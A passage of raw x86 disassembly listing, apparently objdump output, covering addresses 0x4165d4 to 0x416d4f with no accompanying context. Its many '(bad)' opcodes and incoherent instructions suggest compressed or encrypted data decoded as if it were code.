  4165d4:	(bad)  
  4165d5:	in     eax,0xb0
  4165d7:	mov    cl,bl
  4165d9:	mov    ch,BYTE PTR [ecx+0x5bb36206]
  4165df:	xchg   edi,eax
  4165e0:	or     eax,0x203183bc
  4165e5:	cwde   
  4165e6:	mov    bh,0x20
  4165e8:	aas    
  4165e9:	jecxz  0x4165ab
  4165eb:	clc    
  4165ec:	cmp    ecx,eax
  4165ee:	int    0x30
  4165f0:	not    BYTE PTR [ecx]
  4165f2:	mov    DWORD PTR [edi],eax
  4165f4:	pop    eax
  4165f5:	pop    esi
  4165f6:	mov    DWORD PTR [ebp+0x63],eax
  4165f9:	int    0x4d
  4165fb:	test   eax,0x5e706120
  416600:	ins    BYTE PTR es:[edi],dx
  416601:	call   DWORD PTR [esi+0x240dccde]
  416607:	xchg   ecx,eax
  416608:	out    dx,eax
  416609:	jbe    0x416636
  41660b:	jo     0x41664c
  41660d:	leave  
  41660e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41660f:	pop    edx
  416610:	(bad)  
  416612:	push   0x48
  416614:	mov    ebp,esi
  416616:	cli    
  416617:	and    al,0x68
  416619:	jmp    0x41666b
  41661b:	mov    ch,0xfa
  41661d:	or     eax,0x18cebe28
  416622:	or     eax,0x48b662cb
  416627:	es push ss
  416629:	pusha  
  41662a:	fwait
  41662b:	push   0xffffffd6
  41662d:	outs   dx,DWORD PTR ds:[esi]
  41662e:	dec    ecx
  41662f:	dec    eax
  416630:	icebp  
  416631:	mov    dh,0xda
  416633:	mov    bl,0xee
  416635:	retf   0x1484
  416638:	jb     0x4166a5
  41663a:	mov    esi,0xf0b129e8
  41663f:	int    0x98
  416641:	scas   eax,DWORD PTR es:[edi]
  416642:	push   cs
  416643:	fidiv  DWORD PTR [eax+0x46]
  416646:	mov    ecx,0x518e0394
  41664b:	add    dh,BYTE PTR [ecx-0x13310bfe]
  416651:	fs pop ds
  416653:	and    ch,BYTE PTR [ebx+0x72f9134]
  416659:	jge    0x416631
  41665b:	frstor [edx-0x65]
  41665e:	push   ebp
  41665f:	push   eax
  416660:	bnd ret 
  416662:	jmp    0x416679
  416664:	inc    ebx
  416665:	stos   DWORD PTR es:[edi],eax
  416666:	data16 mov ah,0xe8
  416669:	mov    cl,0x70
  41666b:	and    eax,0xe274ef45
  416670:	dec    edi
  416671:	retf   0xc4a6
  416674:	repz xchg edx,eax
  416676:	or     al,0x42
  416678:	jge    0x4166f7
  41667a:	in     eax,dx
  41667b:	aas    
  41667c:	push   ds
  41667d:	(bad)  
  41667e:	call   0x7893dec2
  416683:	xchg   ecx,eax
  416684:	dec    ebp
  416685:	and    al,0xfe
  416687:	adc    eax,0xa7eed86f
  41668c:	sbb    DWORD PTR [eax-0x17],edi
  41668f:	add    eax,0xd6cebca2
  416694:	mov    eax,ds:0x2a448de2
  416699:	jge    0x416658
  41669b:	repz jnp 0x4166e5
  41669e:	xchg   edi,eax
  41669f:	mov    ebx,DWORD PTR [ebx+0x2c]
  4166a2:	xchg   ebp,eax
  4166a3:	or     eax,0x49cb65db
  4166a8:	xchg   BYTE PTR [esp+ebp*1-0x7d530bd7],ch
  4166af:	adc    DWORD PTR [edx+0x1dbe1a4a],edi
  4166b5:	fcom   st(0)
  4166b7:	scas   eax,DWORD PTR es:[edi]
  4166b8:	jno    0x416686
  4166ba:	shl    edx,0x6a
  4166bd:	lea    ebp,[ebx-0x26]
  4166c0:	aad    0x19
  4166c2:	mov    eax,ds:0x73fd222b
  4166c7:	xor    eax,0xa85d6a34
  4166cc:	(bad)  
  4166cd:	in     eax,0x35
  4166cf:	push   ebp
  4166d0:	mov    eax,ds:0x46570414
  4166d5:	idiv   dh
  4166d7:	fdivr  DWORD PTR [ebx]
  4166d9:	xor    edi,ebx
  4166db:	out    dx,eax
  4166dc:	ret    0xc4ae
  4166df:	cmc    
  4166e0:	popa   
  4166e1:	test   BYTE PTR [ecx+0x6b],al
  4166e4:	es xchg edi,eax
  4166e6:	popa   
  4166e7:	or     ch,bl
  4166e9:	adc    ecx,DWORD PTR [ebp+0x1b]
  4166ec:	fiadd  DWORD PTR [edx+0x27]
  4166ef:	dec    ebx
  4166f0:	out    0x6e,al
  4166f2:	das    
  4166f3:	popa   
  4166f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4166f5:	pop    ebx
  4166f6:	and    eax,0xcae2e13b
  4166fb:	dec    esi
  4166fc:	inc    edx
  4166fd:	and    eax,0x736d6db2
  416702:	pop    ecx
  416703:	sbb    edx,esi
  416705:	push   es
  416706:	call   0xc7dd247d
  41670b:	bnd jnp 0x4166a4
  41670e:	and    DWORD PTR [edx],edi
  416710:	(bad)  
  416711:	int    0x68
  416713:	adc    al,0x9a
  416715:	xchg   ecx,eax
  416716:	xor    ch,BYTE PTR [ebx+0x1ffbec84]
  41671c:	fld    TBYTE PTR [ebp+0x48dcbc9]
  416722:	addr16 pop edi
  416724:	idiv   DWORD PTR [ecx]
  416726:	(bad)  
  416727:	es jle 0x4166be
  41672a:	loope  0x416741
  41672c:	pop    eax
  41672d:	xor    DWORD PTR [edx+ecx*8+0x27e0c2dc],eax
  416734:	sub    bh,0x6b
  416737:	push   edi
  416738:	stc    
  416739:	jb     0x41675c
  41673b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41673c:	fld    QWORD PTR [ebp-0x72]
  41673f:	lea    edi,[ebx]
  416741:	lods   eax,DWORD PTR ds:[esi]
  416742:	xor    ax,0x29b1
  416746:	jp     0x41674d
  416748:	test   eax,0x2308d76d
  41674d:	in     eax,dx
  41674e:	outs   dx,BYTE PTR ds:[esi]
  41674f:	sar    cl,1
  416751:	(bad)  
  416752:	pop    ecx
  416753:	or     BYTE PTR [ebx+0x4bbf17da],bl
  416759:	and    edx,DWORD PTR ds:0x823eb3c5
  41675f:	mov    eax,0x3527cc7b
  416764:	cs cmc 
  416766:	sti    
  416767:	(bad)  
  416769:	aaa    
  41676a:	sbb    DWORD PTR [ebp-0x3f],eax
  41676d:	out    dx,eax
  41676e:	mov    ?,edi
  416770:	in     al,dx
  416771:	inc    ebx
  416772:	mov    cl,0xf0
  416774:	pop    edi
  416775:	dec    eax
  416776:	inc    ebx
  416777:	add    al,0x33
  416779:	push   esi
  41677a:	push   esi
  41677b:	shl    DWORD PTR [esi+0x56],cl
  41677e:	and    esp,DWORD PTR [edx-0x54dbd03d]
  416784:	leave  
  416785:	pop    esi
  416786:	push   edi
  416787:	jl     0x4167fe
  416789:	xchg   ecx,eax
  41678a:	mov    bh,0x39
  41678c:	dec    edi
  41678d:	mov    dh,0x93
  41678f:	repnz leave 
  416791:	ror    BYTE PTR [eax-0x243af348],cl
  416797:	icebp  
  416798:	pop    esi
  416799:	ss and al,0xa
  41679c:	scas   eax,DWORD PTR es:[edi]
  41679d:	dec    edx
  41679e:	sbb    ebp,esp
  4167a0:	sbb    bl,BYTE PTR [ebx-0x63]
  4167a3:	xor    eax,0x69f50135
  4167a8:	mov    esi,0x9487beb2
  4167ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4167ae:	mov    ecx,DWORD PTR [esi]
  4167b0:	jnp    0x416780
  4167b2:	imul   ebx,ebp,0x9c861bf8
  4167b8:	add    BYTE PTR [eax],bl
  4167ba:	ja     0x4167ac
  4167bc:	cmp    BYTE PTR [eax],bh
  4167be:	lods   al,BYTE PTR ds:[esi]
  4167bf:	hlt    
  4167c0:	fdiv   st,st(2)
  4167c2:	fwait
  4167c3:	retf   
  4167c4:	xor    eax,0x44a65bab
  4167c9:	js     0x4167b8
  4167cb:	jecxz  0x4167ac
  4167cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4167ce:	addr16 fsubrp st(7),st
  4167d1:	mov    WORD PTR [edi+0x7],es
  4167d4:	mov    ecx,0xd5287a6
  4167d9:	mov    dh,0x3d
  4167db:	mov    esi,0x366bc9c9
  4167e0:	xchg   esp,eax
  4167e1:	xchg   esp,eax
  4167e2:	idiv   DWORD PTR [edx]
  4167e4:	push   0x7c2d61dc
  4167e9:	lock sub DWORD PTR [eax-0x35],ebp
  4167ed:	sub    dl,BYTE PTR [edi-0x28]
  4167f0:	sahf   
  4167f1:	hlt    
  4167f2:	ret    
  4167f3:	mov    cl,dh
  4167f5:	sbb    edx,DWORD PTR [eax+0x46]
  4167f8:	xor    ah,BYTE PTR [esi+0x57]
  4167fb:	dec    ebx
  4167fc:	and    ebp,DWORD PTR [edi+0x72]
  4167ff:	mov    al,0xb0
  416801:	inc    edx
  416802:	rcl    ebp,1
  416804:	repnz loope 0x416880
  416807:	pop    esi
  416808:	ins    BYTE PTR es:[edi],dx
  416809:	clc    
  41680a:	ds mov esi,0xb78660d7
  416810:	rcr    BYTE PTR [ecx+0x21],cl
  416813:	add    bh,BYTE PTR [ebx-0x310ff247]
  416819:	inc    edi
  41681a:	add    ch,dl
  41681c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41681d:	adc    eax,0x8baf4e71
  416822:	ds mov ebx,0x43357abf
  416828:	pop    es
  416829:	mov    eax,0x76694aff
  41682e:	jnp    0x4167cc
  416830:	in     al,dx
  416831:	dec    edx
  416832:	mov    cl,0x2e
  416834:	cli    
  416835:	inc    edi
  416836:	cmp    al,0x9f
  416838:	mov    al,ds:0xd6457b40
  41683d:	ja     0x4167ef
  41683f:	shl    DWORD PTR [eax],0x8
  416842:	dec    edx
  416843:	cbw    
  416845:	mov    edx,DWORD PTR [edi-0x26]
  416848:	pop    edx
  416849:	inc    esi
  41684a:	int3   
  41684b:	je     0x416820
  41684d:	and    ch,BYTE PTR [edi-0x56]
  416850:	mov    DWORD PTR [edi],esp
  416852:	fidivr DWORD PTR [ecx+0x45]
  416855:	mov    bh,0x86
  416857:	in     eax,dx
  416858:	mov    al,ds:0x366b31ef
  41685d:	(bad)  
  41685e:	jecxz  0x4167e5
  416860:	adc    eax,0x2bb1f17f
  416865:	dec    ebp
  416866:	xlat   BYTE PTR ds:[ebx]
  416867:	adc    ebx,DWORD PTR [esi+ebx*2-0x14a67329]
  41686e:	ins    BYTE PTR es:[edi],dx
  41686f:	adc    BYTE PTR [edx],ah
  416871:	adc    ch,bl
  416873:	or     al,0xc4
  416875:	jo     0x41683a
  416877:	(bad)
  41687a:	inc    ebp
  41687b:	es repnz dec esi
  41687e:	in     al,dx
  41687f:	es aas 
  416881:	xor    al,0x93
  416883:	sbb    bl,BYTE PTR [edi-0x58923455]
  416889:	aas    
  41688a:	lods   eax,DWORD PTR ds:[esi]
  41688b:	add    eax,0xcc124063
  416890:	push   ecx
  416891:	rol    DWORD PTR [edi-0x4b2832ff],1
  416897:	pushf  
  416898:	fadd   QWORD PTR [ebp-0x68]
  41689b:	imul   edi,DWORD PTR [edx],0xda6b6231
  4168a1:	adc    al,0x25
  4168a3:	inc    eax
  4168a4:	aam    0xac
  4168a6:	jb     0x4168f5
  4168a8:	rcl    BYTE PTR [ebp+0x3250a02b],1
  4168ae:	push   esi
  4168af:	stos   BYTE PTR es:[edi],al
  4168b0:	retf   
  4168b1:	dec    ecx
  4168b2:	mov    ds,WORD PTR [ecx+esi*2+0x5c2f508a]
  4168b9:	push   esi
  4168bb:	leave  
  4168bc:	push   0xe4844f99
  4168c1:	push   ebx
  4168c2:	cmc    
  4168c3:	sub    esi,DWORD PTR [edi-0x58]
  4168c6:	fstp   TBYTE PTR [edx]
  4168c8:	in     eax,0x6a
  4168ca:	enter  0xec64,0xb7
  4168ce:	mov    bl,0x7f
  4168d0:	pop    ebx
  4168d1:	ins    DWORD PTR es:[edi],dx
  4168d2:	jle    0x41688f
  4168d4:	rep repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4168d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4168d8:	jle    0x4168a3
  4168da:	int3   
  4168db:	dec    ecx
  4168dc:	ds jb  0x416875
  4168df:	scas   eax,DWORD PTR es:[edi]
  4168e0:	xor    DWORD PTR [edx+0x75],edi
  4168e3:	jl     0x4168e7
  4168e5:	xchg   edx,eax
  4168e6:	mov    bl,0x6e
  4168e8:	cmp    DWORD PTR [edx],ecx
  4168ea:	aad    0xab
  4168ec:	ret    0xe7f3
  4168ef:	(bad)  
  4168f0:	sbb    eax,0xff81f15b
  4168f5:	sti    
  4168f6:	mov    BYTE PTR [eax+0x5c],ch
  4168f9:	shl    esi,1
  4168fb:	push   es
  4168fc:	ds loop 0x416908
  4168ff:	adc    bh,cl
  416901:	data16 int 0x95
  416904:	xchg   edx,eax
  416905:	push   ecx
  416906:	ds retf 0x7cfb
  41690a:	inc    eax
  41690b:	(bad)  
  41690d:	repz sub eax,0xa943f38a
  416913:	ss sti 
  416915:	into   
  416916:	sti    
  416917:	lods   eax,DWORD PTR ds:[esi]
  416918:	cli    
  416919:	int3   
  41691a:	or     al,0xf0
  41691c:	jno    0x4168bb
  41691e:	sbb    ch,BYTE PTR [edi]
  416920:	aam    0xf2
  416922:	in     eax,0x6d
  416924:	xchg   ebp,eax
  416925:	das    
  416926:	add    eax,0xf97e9ae1
  41692b:	dec    esp
  41692c:	and    DWORD PTR [edx],esi
  41692e:	jl     0x4168d1
  416930:	fnstsw WORD PTR [edx+0x9f0d838]
  416936:	fnstenv [ecx+0x7693cbf3]
  41693c:	adc    eax,0xf13ffd44
  416941:	aam    0x57
  416943:	fwait
  416944:	xor    bl,BYTE PTR [edx-0x7c431ae0]
  41694a:	arpl   WORD PTR [edx],si
  41694c:	call   0x9a84fed
  416951:	and    eax,0xb9e5a5bb
  416956:	adc    DWORD PTR [ebx+0x15909e28],ecx
  41695c:	fsub   QWORD PTR [edi-0x35]
  41695f:	xchg   BYTE PTR [edi+0x79],al
  416962:	ja     0x416905
  416964:	mov    ecx,0x67a90a6e
  416969:	xchg   DWORD PTR [edx],edx
  41696b:	mov    esi,0xb269798
  416970:	enter  0x8d2b,0x4a
  416974:	inc    ebp
  416975:	push   eax
  416976:	inc    edi
  416977:	test   BYTE PTR [esi+0x56],0xad
  41697b:	mov    edx,0x5f89c54d
  416980:	jbe    0x41699c
  416982:	pop    eax
  416983:	add    dh,BYTE PTR [ecx]
  416985:	or     eax,0x4d3f66b4
  41698a:	adc    eax,0xd0c30dbf
  41698f:	inc    edi
  416990:	int    0x1e
  416992:	mov    esi,0xd312e8f1
  416997:	cs clc 
  416999:	int3   
  41699a:	fdivr  st(1),st
  41699c:	xor    dl,BYTE PTR [edi+0x4cc5f6f8]
  4169a2:	sbb    BYTE PTR [edx+0x471e26a5],al
  4169a8:	ins    BYTE PTR es:[edi],dx
  4169a9:	into   
  4169aa:	sub    DWORD PTR [ebx+0x509e3b52],esi
  4169b0:	ret    
  4169b1:	cwde   
  4169b2:	cdq    
  4169b3:	out    dx,al
  4169b4:	push   eax
  4169b5:	(bad)  
  4169b6:	rol    DWORD PTR [eax+0x8],1
  4169b9:	(bad)  
  4169ba:	scas   al,BYTE PTR es:[edi]
  4169bb:	pop    ds
  4169bc:	(bad)  
  4169bd:	aaa    
  4169be:	inc    edx
  4169bf:	mov    eax,ds:0x28e1acb
  4169c4:	pop    es
  4169c5:	popa   
  4169c6:	and    eax,0xc75b241c
  4169cb:	pop    edx
  4169cc:	clc    
  4169cd:	les    ebx,FWORD PTR [eax]
  4169cf:	pushf  
  4169d0:	daa    
  4169d1:	fcom   DWORD PTR [ebp+0x28]
  4169d4:	mov    ch,0xa
  4169d6:	stc    
  4169d7:	adc    esp,esp
  4169d9:	pop    es
  4169da:	pop    es
  4169db:	icebp  
  4169dc:	int3   
  4169dd:	ret    0x1bc7
  4169e0:	pusha  
  4169e1:	inc    ebx
  4169e2:	adc    ah,dh
  4169e4:	push   cs
  4169e5:	into   
  4169e6:	sbb    BYTE PTR [edi-0x628643d5],bl
  4169ec:	mov    cs,WORD PTR [ecx]
  4169ee:	lahf   
  4169ef:	outs   dx,DWORD PTR ds:[esi]
  4169f0:	iret   
  4169f1:	lahf   
  4169f2:	push   0x2b3c21d9
  4169f7:	mov    eax,ds:0x1ac057b1
  4169fc:	retf   0x4454
  4169ff:	pop    ebx
  416a00:	and    eax,0x18463163
  416a05:	fstp   QWORD PTR [edx+0x42]
  416a08:	mov    dh,0xfa
  416a0a:	lahf   
  416a0b:	xchg   ebx,eax
  416a0c:	int3   
  416a0d:	js     0x4169a5
  416a0f:	int    0xef
  416a11:	mov    esp,0x672425b2
  416a16:	inc    eax
  416a17:	lahf   
  416a18:	push   0x885ef42a
  416a1d:	adc    esi,esp
  416a1f:	xchg   ecx,eax
  416a20:	jmp    0x6208:0x7ff06144
  416a27:	jbe    0x4169f9
  416a29:	mov    edx,0xb32af895
  416a2e:	pop    esi
  416a2f:	loopne 0x416a0f
  416a31:	sbb    DWORD PTR [eax],edx
  416a33:	mov    cl,0xb9
  416a35:	cmp    eax,DWORD PTR [esi-0x5365659f]
  416a3b:	cmp    eax,0x4d34ce05
  416a40:	int3   
  416a41:	sahf   
  416a42:	jns    0x4169e8
  416a44:	arpl   cx,bx
  416a46:	cmp    eax,0xab30f853
  416a4b:	push   cs
  416a4c:	or     al,0x92
  416a4e:	push   edi
  416a4f:	adc    al,0x3
  416a51:	xchg   edx,eax
  416a52:	and    edx,esp
  416a54:	sbb    al,0xf5
  416a56:	add    dl,BYTE PTR [edi-0x27]
  416a59:	mov    ch,0x9a
  416a5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a5c:	cmp    eax,0x7914a695
  416a61:	xchg   edx,eax
  416a62:	lods   eax,DWORD PTR ds:[esi]
  416a63:	lea    ebx,[esi]
  416a65:	aam    0x16
  416a67:	mov    al,ds:0x92e2b748
  416a6c:	push   ebp
  416a6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a6e:	cmp    esi,ebx
  416a70:	push   esi
  416a71:	popf   
  416a72:	(bad)  [ebp+0x22bc9ee6]
  416a78:	xor    esi,0xfa9a39c3
  416a7e:	jnp    0x416a7c
  416a80:	or     dl,BYTE PTR [ebx+0x170d3e27]
  416a86:	stos   DWORD PTR es:[edi],eax
  416a87:	xchg   ebp,eax
  416a88:	cli    
  416a89:	(bad)  
  416a8a:	cmp    al,0x23
  416a8c:	out    0xfd,eax
  416a8e:	pushf  
  416a8f:	or     BYTE PTR [edi-0x204252a6],ch
  416a95:	or     edi,ebp
  416a97:	int3   
  416a98:	test   DWORD PTR [ebp+0x29],edx
  416a9b:	retf   
  416a9c:	or     al,0xda
  416a9e:	sub    al,0x2c
  416aa0:	xchg   ebp,eax
  416aa1:	fild   WORD PTR [ebx+ebp*8+0x556c4dbe]
  416aa8:	cmc    
  416aa9:	and    DWORD PTR [edx+0x49],0x53
  416aad:	adc    cl,BYTE PTR [ecx]
  416aaf:	xchg   ebx,eax
  416ab0:	popa   
  416ab1:	jnp    0x416ae3
  416ab3:	xchg   edi,eax
  416ab4:	push   ebp
  416ab5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416ab6:	ds cmp eax,0x44309ff6
  416abc:	jo     0x416a8e
  416abe:	in     eax,dx
  416abf:	std    
  416ac0:	pop    edx
  416ac1:	arpl   WORD PTR [ebp-0x69913563],sp
  416ac7:	cmp    al,0x16
  416ac9:	mov    cl,0x40
  416acb:	mov    eax,0xf86582d1
  416ad0:	ja     0x416ae9
  416ad2:	cmp    edx,DWORD PTR [eax-0x6ce9b110]
  416ad8:	je     0x416a84
  416ada:	in     eax,dx
  416adb:	dec    DWORD PTR [esi+0x71]
  416ade:	neg    DWORD PTR [ecx]
  416ae0:	jo     0x416a84
  416ae2:	not    BYTE PTR [eax]
  416ae4:	push   0x15
  416ae6:	(bad)  
  416ae7:	push   ebx
  416ae8:	loop   0x416b51
  416aea:	jne    0x416a77
  416aec:	sbb    al,0xa8
  416aee:	ret    
  416aef:	iret   
  416af0:	cs in  al,0xd7
  416af3:	push   edx
  416af4:	aad    0xf1
  416af6:	aad    0x18
  416af8:	call   0xd99159e3
  416afd:	sub    al,0x4c
  416aff:	push   es
  416b00:	cs or  esp,ebp
  416b03:	out    0x44,al
  416b05:	mov    WORD PTR [edx+0x5e],fs
  416b08:	or     esi,edi
  416b0a:	rcr    BYTE PTR [ecx],cl
  416b0c:	cmp    cl,0x8b
  416b0f:	clc    
  416b10:	pop    esi
  416b11:	in     eax,dx
  416b12:	arpl   WORD PTR ds:0xdb3f6e20,si
  416b18:	imul   ebp,DWORD PTR [ebp-0x67f72de4],0xa4d4e2d4
  416b22:	sub    BYTE PTR [edi+eiz*8-0x52],ah
  416b26:	inc    edi
  416b27:	jnp    0x416b37
  416b29:	mov    bh,0x83
  416b2b:	mov    edi,0x99791c1
  416b30:	pop    edi
  416b31:	pop    esi
  416b32:	stos   BYTE PTR es:[edi],al
  416b33:	mov    BYTE PTR [esi+0x50],bh
  416b36:	in     al,0x77
  416b38:	cdq    
  416b39:	test   DWORD PTR [ecx-0x7f],eax
  416b3c:	jne    0x416b31
  416b3e:	sahf   
  416b3f:	fcomip st,st(3)
  416b41:	pop    es
  416b42:	add    al,0x31
  416b44:	and    DWORD PTR [esi-0x16e06141],eax
  416b4a:	leave  
  416b4b:	xchg   edi,eax
  416b4c:	cmp    esi,DWORD PTR [edi+0x497e6023]
  416b52:	or     ecx,DWORD PTR [ecx+0x36]
  416b55:	mov    edx,0x2599cb50
  416b5a:	xchg   ebx,eax
  416b5b:	imul   ebp,DWORD PTR [ebx-0x5bf100f],0x47
  416b62:	inc    ebx
  416b63:	jbe    0x416b5b
  416b65:	sar    DWORD PTR ds:0x12c2e939,1
  416b6b:	xchg   ebp,eax
  416b6c:	shl    edx,1
  416b6e:	add    esi,DWORD PTR [esi-0x1015981e]
  416b74:	int3   
  416b75:	cmp    BYTE PTR gs:[eax-0x7a],cl
  416b79:	pop    ebx
  416b7a:	xor    esp,DWORD PTR [ecx+edx*2]
  416b7d:	ficom  WORD PTR [ebp-0x30]
  416b80:	mov    BYTE PTR [ecx-0x179ed9d7],ah
  416b86:	jo     0x416b18
  416b88:	sbb    al,0x2
  416b8a:	jge    0x416bb2
  416b8c:	scas   al,BYTE PTR es:[edi]
  416b8d:	push   eax
  416b8e:	mov    bl,0xf5
  416b90:	jle    0x416b76
  416b92:	adc    al,0xa6
  416b94:	mov    edi,0x6c507ce3
  416b99:	cmp    BYTE PTR [eax],bl
  416b9b:	and    eax,DWORD PTR [edx-0x36]
  416b9e:	addr16 mov dl,0x18
  416ba1:	mov    DWORD PTR [edx+edx*1],ebp
  416ba4:	mov    bh,0xee
  416ba6:	inc    edi
  416ba7:	sub    bl,BYTE PTR [edi+0x229a3166]
  416bad:	jbe    0x416be3
  416baf:	jno    0x416c10
  416bb1:	fst    QWORD PTR [ebp+ecx*2+0x65f3e3be]
  416bb8:	mov    eax,ds:0xc7cc7fbf
  416bbd:	out    0x66,eax
  416bbf:	or     ebp,DWORD PTR es:[ebx]
  416bc2:	push   es
  416bc3:	sahf   
  416bc4:	hlt    
  416bc5:	cmp    esp,DWORD PTR [ecx]
  416bc7:	sub    dl,al
  416bc9:	fs ret 0x3851
  416bcd:	cs jne 0x416be2
  416bd0:	jmp    0x35fe:0x47e008c9
  416bd7:	je     0x416b74
  416bd9:	mov    dl,0xd3
  416bdb:	mov    cl,0xc9
  416bdd:	mov    ebp,0x793e7e5a
  416be2:	push   esi
  416be4:	mov    dl,0xb1
  416be6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416be7:	mov    edi,ebx
  416be9:	inc    edi
  416bea:	xor    DWORD PTR [ecx+0x542795e],edx
  416bf0:	and    DWORD PTR [ebp*1+0x353ee3f6],0xd78a56c3
  416bfb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416bfc:	jb     0x416c45
  416bfe:	push   es
  416bff:	xlat   BYTE PTR ds:[ebx]
  416c00:	retf   
  416c01:	mov    ebx,0xe946b512
  416c06:	pusha  
  416c07:	dec    ebp
  416c08:	jnp    0x416bd2
  416c0a:	jnp    0x416c51
  416c0c:	inc    esp
  416c0d:	sahf   
  416c0e:	stc    
  416c0f:	in     eax,dx
  416c10:	mov    dh,0x4a
  416c12:	ss clc 
  416c14:	iret   
  416c15:	dec    edi
  416c16:	lods   al,BYTE PTR ds:[esi]
  416c17:	fwait
  416c18:	pop    esp
  416c19:	cmp    al,0x64
  416c1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c1c:	lods   al,BYTE PTR ds:[esi]
  416c1d:	dec    esi
  416c1e:	xchg   ebp,eax
  416c1f:	cmp    DWORD PTR [ecx-0x5b],edi
  416c22:	adc    al,0xa1
  416c24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c25:	inc    ebp
  416c26:	cmp    BYTE PTR [edx],0x46
  416c29:	sub    al,0xed
  416c2b:	xor    ebp,esi
  416c2d:	or     esp,ebp
  416c2f:	aad    0x34
  416c31:	sti    
  416c32:	jl     0x416c4b
  416c34:	retf   0x4937
  416c37:	bound  esi,QWORD PTR [eax]
  416c39:	mov    ch,BYTE PTR [ebx]
  416c3b:	es inc edi
  416c3d:	or     bl,cl
  416c3f:	nop
  416c40:	and    DWORD PTR [eax],ebx
  416c42:	xchg   ebx,eax
  416c43:	nop
  416c44:	jl     0x416be7
  416c46:	rol    dh,1
  416c48:	sub    al,0xd
  416c4a:	scas   al,BYTE PTR es:[edi]
  416c4b:	pop    ebx
  416c4c:	jge    0x416bdd
  416c4e:	adc    DWORD PTR [edi],edx
  416c50:	and    DWORD PTR [edi*4-0x4a43bcc4],ebx
  416c57:	jmp    0x416c83
  416c59:	(bad)  
  416c5a:	aaa    
  416c5b:	gs aas 
  416c5d:	ret    0x9bd8
  416c60:	inc    esi
  416c61:	dec    ecx
  416c62:	sahf   
  416c63:	es inc ebp
  416c65:	data16 adc dl,BYTE PTR [edi]
  416c68:	daa    
  416c69:	(bad)  
  416c6a:	fidiv  WORD PTR [eax+edx*2-0x9]
  416c6e:	mov    BYTE PTR [ecx],dl
  416c70:	ror    DWORD PTR [ebx-0x38],0xde
  416c74:	loopne 0x416cc8
  416c76:	(bad)  
  416c77:	ret    0xc532
  416c7a:	pop    es
  416c7b:	inc    eax
  416c7c:	dec    DWORD PTR [eax]
  416c7e:	sahf   
  416c7f:	mov    dl,0xcf
  416c81:	dec    esi
  416c82:	and    DWORD PTR [esi-0x68fb3761],0x869cac34
  416c8c:	push   eax
  416c8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c8e:	mov    dh,0x67
  416c90:	ror    DWORD PTR [esi+0x26],1
  416c93:	sub    eax,DWORD PTR [ebx-0x21]
  416c96:	mov    edi,ss
  416c98:	inc    edi
  416c99:	inc    ecx
  416c9a:	sbb    al,0x2c
  416c9c:	in     eax,dx
  416c9d:	jae    0x416c56
  416c9f:	out    dx,al
  416ca0:	jno    0x416c36
  416ca2:	rol    BYTE PTR [ecx],0x33
  416ca5:	outs   dx,DWORD PTR ds:[esi]
  416ca6:	call   0xb983266f
  416cab:	stos   DWORD PTR es:[edi],eax
  416cac:	pop    edi
  416cad:	mov    dl,0xb5
  416caf:	enter  0x8b5f,0xa5
  416cb3:	dec    esp
  416cb4:	xor    eax,0x1d82ede0
  416cb9:	sbb    ah,0xb8
  416cbc:	mov    dl,0xa5
  416cbe:	ds stos DWORD PTR es:[edi],eax
  416cc0:	jl     0x416c89
  416cc2:	repnz inc esp
  416cc4:	lea    ebp,[ebx]
  416cc6:	mov    ah,0x94
  416cc8:	mov    dl,0x60
  416cca:	cdq    
  416ccb:	scas   al,BYTE PTR es:[edi]
  416ccc:	mov    dl,0x4b
  416cce:	int3   
  416ccf:	push   esi
  416cd0:	cdq    
  416cd1:	inc    esp
  416cd2:	pop    ebp
  416cd3:	pmullw mm6,QWORD PTR [esi]
  416cd6:	xor    esi,edx
  416cd8:	fadd   QWORD PTR [eax+edx*4]
  416cdb:	shr    BYTE PTR [esi+eiz*8+0x3a6803f6],0x17
  416ce3:	arpl   WORD PTR [ecx+0x67],di
  416ce6:	out    0xf5,al
  416ce8:	mov    edx,0x4ff5d677
  416ced:	adc    BYTE PTR [edx],0x1f
  416cf0:	test   eax,0x4d171823
  416cf5:	mov    edi,0x4396216
  416cfa:	inc    ebp
  416cfb:	(bad)  
  416cfc:	push   edi
  416cfd:	stos   BYTE PTR es:[edi],al
  416cfe:	xchg   edi,eax
  416cff:	push   ss
  416d00:	outs   dx,BYTE PTR ds:[esi]
  416d01:	ss jbe 0x416cf6
  416d04:	jno    0x416d3d
  416d06:	mov    ah,0x2e
  416d08:	push   edx
  416d09:	xlat   BYTE PTR ds:[ebx]
  416d0a:	push   0x61aaa5db
  416d0f:	fisubr WORD PTR [ebx-0xbae8d21]
  416d15:	lock mov eax,0x4063688e
  416d1b:	inc    ebp
  416d1c:	fcmovnu st,st(3)
  416d1e:	fistp  QWORD PTR [edi-0x419d7f99]
  416d24:	iret   
  416d25:	sbb    eax,0x31b599c9
  416d2a:	stos   BYTE PTR es:[edi],al
  416d2b:	ins    BYTE PTR es:[edi],dx
  416d2c:	sub    DWORD PTR [ebp-0x29],ecx
  416d2f:	dec    esi
  416d30:	inc    eax
  416d31:	pop    edi
  416d32:	mov    ah,0x33
  416d34:	out    dx,al
  416d35:	adc    di,bp
  416d38:	in     eax,dx
  416d39:	xchg   esi,eax
  416d3a:	sub    BYTE PTR [eax-0x44],ch
  416d3d:	push   es
  416d3e:	jecxz  0x416d0a
  416d40:	fisttp WORD PTR [edx]
  416d42:	mov    dh,bh
  416d44:	cmp    eax,0xbb6a8159
  416d49:	dec    ebx
  416d4a:	stos   BYTE PTR es:[edi],al
  416d4b:	sub    BYTE PTR [edi],al
  416d4d:	push   0x6f
  416d4f:	sti    
